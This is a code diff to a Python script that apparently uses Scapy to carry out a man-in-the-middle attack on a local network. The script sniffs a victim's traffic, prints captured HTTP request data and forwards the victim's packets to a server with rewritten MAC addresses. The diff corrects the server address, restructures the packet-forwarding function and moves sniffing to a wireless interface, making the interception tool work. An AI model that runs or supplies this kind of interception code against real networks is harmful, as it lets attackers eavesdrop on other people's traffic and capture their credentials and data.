@@ -7,7 +7,7 @@ def setup():
     global victim_ip, victim_mac, server_ip, server_mac, my_mac
     victim_ip = "192.168.2.100"
     victim_mac = get_mac(victim_ip)
-    server_ip = "192.168.2.100"
+    server_ip = "192.168.2.102"
     server_mac = get_mac(server_ip)
     my_mac = open(f"/sys/class/net/eth0/address").read().strip()
 
@@ -22,10 +22,10 @@ def http_packet(packet):
         print("\nCaptured GET data: ", raw_data)
 
 def forward_packet(packet):
-    packet2 = copy.deepcopy(packet)
-    if packet.haslayer(http.HTTPRequest) or packet.haslayer(Raw):
-        http_packet(packet)
     if packet.haslayer(Ether) and packet.haslayer(IP):
+        packet2 = copy.deepcopy(packet)
+        if packet.haslayer(Raw):
+            http_packet(packet)
         if packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
             packet2[Ether].dst = server_mac
             sendp(packet2)
@@ -38,7 +38,7 @@ def forward_packet(packet):
 def MITM_attack():
     try:
         print("Starting MITM attack. . .")
-        sniff(iface="eth0", prn=forward_packet, store=0)
+        sniff(iface="wlan0", prn=forward_packet, store=0)
     except KeyboardInterrupt:
         print("\nMITM attack terminated")
     return None
